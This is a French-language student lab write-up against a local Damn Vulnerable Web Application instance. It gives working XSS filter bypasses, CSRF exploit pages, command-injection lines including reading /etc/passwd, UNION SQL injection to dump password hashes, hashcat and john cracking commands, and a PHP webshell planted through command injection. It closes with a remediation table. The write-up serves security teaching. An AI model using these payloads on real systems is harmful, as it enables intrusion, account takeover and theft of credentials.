# DVWA — Writeup Sécurité Offensive (Low / Medium / High)

> **Cible :** Damn Vulnerable Web Application (Web Security Dojo)
> **Environnement :** VM de lab isolée — application *volontairement* vulnérable
> **Contexte :** ESEO — spécialité Cloud, Système & Sécurité

> ⚠️ **Périmètre.** Tout ce qui suit s'exécute contre une instance DVWA **locale**, conçue pour l'entraînement. Aucune cible tierce, aucun compte réel. Ces techniques ne se transposent pas sur un système sans autorisation écrite — c'est le cadre légal et déontologique du pentest.

## Sommaire

1. [Préparation & niveaux de sécurité](#1-préparation--niveaux-de-sécurité)
2. [XSS Reflected](#2-xss-reflected-low--medium--high)
3. [XSS Stored](#3-xss-stored-low--medium--high)
4. [CSRF](#4-csrf-low)
5. [Command Injection](#5-command-injection-low)
6. [SQL Injection + cracking](#6-sql-injection--cracking-low)
7. [Bonus — webshell sans upload](#7-bonus--webshell-sans-upload)
8. [Récap défensif (remédiations)](#8-récap-défensif-remédiations)

---

## 1. Préparation & niveaux de sécurité

Connexion : `admin / password`. Puis **DVWA Security** → régler le niveau selon l'exercice. Le niveau change le **code source** de la page vulnérable : on observe la même faille se défendre de mieux en mieux.

- **Low** — aucun filtrage, code volontairement naïf.
- **Medium** — filtrage partiel et contournable (blacklist simpliste).
- **High** — filtrage plus sérieux, mais souvent encore imparfait.

> 💡 **Tip :** chaque page DVWA a un bouton **View Source** en bas à droite. Lis le source *avant* de lancer un payload : tu passes de « je devine » à « je sais pourquoi ça passe ».

---

## 2. XSS Reflected (Low / Medium / High)

Objectif : afficher une **message box JS** (`alert()`). Principe du XSS réfléchi : une entrée utilisateur est renvoyée telle quelle dans la page, donc un payload HTML/JS est exécuté par le navigateur.

### 🟢 Low

Le paramètre `name` est réinjecté sans aucun filtrage.

```html
<script>alert('XSS')</script>
```

**Pourquoi ça marche :** simple `echo` de l'entrée, zéro échappement → la balise `<script>` arrive intacte dans le DOM et s'exécute.

### 🟠 Medium

Le code applique `str_replace('<script>', '', $name)` : supprime la chaîne `<script>`, mais en minuscules exactes et une seule passe.

```html
<!-- Option A : casse mélangée -->
<sCrIpt>alert('XSS')</sCrIpt>

<!-- Option B : balise sans "script" -->
<img src=x onerror=alert('XSS')>
```

**Pourquoi ça marche :** la blacklist est *sensible à la casse* et ne vise que le mot exact `<script>`. `<sCrIpt>` n'est pas reconnu ; `<img onerror>` n'utilise pas le mot « script ». **Une blacklist échoue dès qu'on change de forme.**

### 🔴 High

Un `preg_replace` insensible à la casse casse toute séquence `s…c…r…i…p…t`. On abandonne cette balise.

```html
<img src=x onerror=alert('XSS')>
<!-- alternative -->
<svg onload=alert('XSS')>
```

**Pourquoi ça marche :** le filtre est obsédé par le mot « script » et oublie que le JS s'exécute aussi via des **gestionnaires d'événements** (`onerror`, `onload`…). Le XSS n'a jamais eu besoin de `<script>`.

---

## 3. XSS Stored (Low / Medium / High)

Même idée, mais le payload est **stocké** (livre d'or) et rejoué à chaque visiteur. Les champs ont un `maxlength` côté client à contourner.

> 💡 **Tip — contourner `maxlength` :** clic droit sur le champ → **Inspecter** → supprime l'attribut `maxlength` (ou augmente sa valeur). Protection purement côté navigateur, inutile côté serveur. On peut aussi intercepter avec Burp/ZAP et éditer le corps après l'envoi.

### 🟢 Low

Ni `name` ni `message` ne sont réellement filtrés.

```html
<script>alert('XSS')</script>
```

**Pourquoi ça marche :** la saisie est insérée en base puis réaffichée brute. Recharge la page → l'alerte repart à chaque affichage du livre d'or.

### 🟠 Medium

Le champ `message` est protégé (`htmlspecialchars` + `strip_tags`), mais `name` n'a qu'un `str_replace('<script>','')` sensible à la casse. On vise le **champ Name**.

```html
<!-- champ Name (maxlength=10 à retirer via Inspecteur) -->
<img src=x onerror=alert('XSS')>
```

**Pourquoi ça marche :** le dev a durci `message` et oublié `name` — l'incohérence de filtrage entre deux champs est une faille classique.

### 🔴 High

Le champ `name` reçoit le filtre regex anti-« script ». Même parade que le reflected High.

```html
<!-- champ Name (maxlength retiré) -->
<img src=x onerror=alert('XSS')>
```

**Pourquoi ça marche :** toujours le même angle mort — le filtre bloque `<script>` mais laisse passer les attributs `on*`. Le `message` reste encodé : d'où l'injection par `name`.

---

## 4. CSRF (Low)

Objectif : changer le mot de passe de la victime **depuis un onglet non authentifié** — forcer son navigateur (déjà connecté) à envoyer la requête à son insu.

**Mécanisme :** en Low, le changement se fait en **GET**, sans jeton anti-CSRF ni mot de passe actuel :

```
GET /vulnerabilities/csrf/?password_new=X&password_conf=X&Change=Change
```

**Exploit — balise image :**

```html
<img src="http://VOTRE-DVWA/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">
```

**Exploit — form auto-soumis :**

```html
<html><body onload="document.forms[0].submit()">
  <form action="http://VOTRE-DVWA/vulnerabilities/csrf/" method="GET">
    <input type="hidden" name="password_new"  value="hacked">
    <input type="hidden" name="password_conf" value="hacked">
    <input type="hidden" name="Change" value="Change">
  </form>
</body></html>
```

**Pourquoi ça marche :** le serveur ne vérifie **que** la présence d'une session valide, portée automatiquement par le cookie. Rien ne prouve que *la victime* a voulu l'action.

> 💡 **Tip démonstration :** teste avec un compte secondaire pour distinguer « victime » et « attaquant », puis reconnecte-toi avec le nouveau mot de passe pour prouver l'impact.

---

## 5. Command Injection (Low)

Objectif : exécuter une commande système. La page « ping » passe l'entrée directement au shell.

```bash
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | whoami
127.0.0.1; cat /etc/passwd
```

**Pourquoi ça marche :** l'appli construit sa commande par concaténation (`ping -c 4 <entrée>`) sans échappement. Les métacaractères shell `;` `&&` `|` enchaînent une **seconde** commande. `127.0.0.1` sert juste à faire réussir le `ping` initial.

---

## 6. SQL Injection + cracking (Low)

Objectif : **voler les couples login/password** des comptes DVWA, puis les **cracker**. La page « User ID » concatène l'entrée dans `SELECT first_name, last_name FROM users WHERE user_id = '$id'` → 2 colonnes en sortie.

### Étape 1 — confirmer l'injection

```sql
1' OR '1'='1
```

### Étape 2 — nombre de colonnes

```sql
1' ORDER BY 2 --    (OK)
1' ORDER BY 3 --    (erreur → 2 colonnes)
```

### Étape 3 — extraire logins + hashs (UNION)

```sql
' UNION SELECT user, password FROM users #
```

**Pourquoi ça marche :** `UNION SELECT` colle les résultats d'une requête contrôlée à ceux de l'appli, à condition d'avoir le même nombre de colonnes (2). `user` → « First name », `password` → « Surname ».

### Étape 4 — cracker les hashs (MD5 non salé)

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
# ou
john --format=raw-md5 --wordlist=rockyou.txt hashes.txt
```

Comptes par défaut DVWA :

| Login     | Hash MD5                           | Mot de passe |
|-----------|------------------------------------|--------------|
| `admin`   | `5f4dcc3b5aa765d61d8327deb882cf99` | `password`   |
| `gordonb` | `e99a18c428cb38d5f260853678922e03` | `abc123`     |
| `1337`    | `8d3533d75ae2c3966d7e0d4fcc69216b` | `charley`    |
| `pablo`   | `0d107d09f5bbe40cade3de5c71e9e9b7` | `letmein`    |
| `smithy`  | `5f4dcc3b5aa765d61d8327deb882cf99` | `password`   |

> 💡 **Tip :** glisse `database()`, `version()` ou `@@version` dans le `UNION SELECT` pour cartographier la base. Tu peux rejouer l'extraction via `sqlmap -u "..." --cookie="PHPSESSID=...; security=low" --dump` — mais fais-le d'abord à la main pour comprendre la logique UNION.

---

## 7. Bonus — webshell sans upload

Objectif : déposer un petit webshell **sans la page d'upload**, puis l'exécuter. On réutilise la **Command Injection**.

### Étape 1 — écrire le shell via injection de commande

```bash
127.0.0.1; echo '<?php system($_GET["c"]); ?>' > /var/www/html/sh.php
```

### Étape 2 — l'exécuter depuis le navigateur

```
http://VOTRE-DVWA/sh.php?c=id
http://VOTRE-DVWA/sh.php?c=whoami
```

**Pourquoi ça marche :** deux faiblesses combinées — l'injection de commande donne l'**écriture de fichier**, et le serveur **interprète le PHP** déposé dans la racine web. Résultat : exécution de commande persistante, atteignable par simple URL.

> ⚠️ **Chemin à adapter :** la racine web dépend de l'install (Web Security Dojo peut différer de `/var/www/html`). Récupère-le avec `127.0.0.1; pwd` ou `127.0.0.1; find / -name dvwa -type d 2>/dev/null`, et vérifie les droits d'écriture.

> 💡 **Variante SQLi :** `UNION SELECT "<?php system($_GET['c']); ?>", null INTO OUTFILE '/chemin/web/sh.php'` — exige le privilège `FILE`, un `secure_file_priv` désactivé et un chemin connu. La voie Command Injection est plus fiable.

---

## 8. Récap défensif (remédiations)

| Faille               | Cause racine                  | Correctif                                                   |
|----------------------|-------------------------------|------------------------------------------------------------|
| XSS (R & S)          | Sortie non encodée            | Encodage en sortie (`htmlspecialchars`), CSP, pas de blacklist |
| CSRF                 | Pas de preuve d'intention     | Jeton anti-CSRF unique par requête + cookies `SameSite`    |
| Command Injection    | Concaténation vers le shell   | Éviter le shell ; sinon `escapeshellarg` + whitelist       |
| SQL Injection        | Requête concaténée            | Requêtes préparées (paramétrées), ORM, moindre privilège   |
| Webshell             | Écriture + exécution racine   | Racine web non inscriptible, `php` désactivé sur les uploads |

> 💡 **Fil rouge du TP :** presque chaque niveau « Medium » utilise une **blacklist** (interdire des formes connues) et chaque bypass l'exploite. On **whiteliste** (autoriser une forme connue-bonne) et surtout on **encode/paramètre en sortie** — on ne court jamais après la liste des formes interdites.

---

*Writeup DVWA — environnement de lab isolé. Usage strictement pédagogique, sur instance personnelle volontairement vulnérable.*
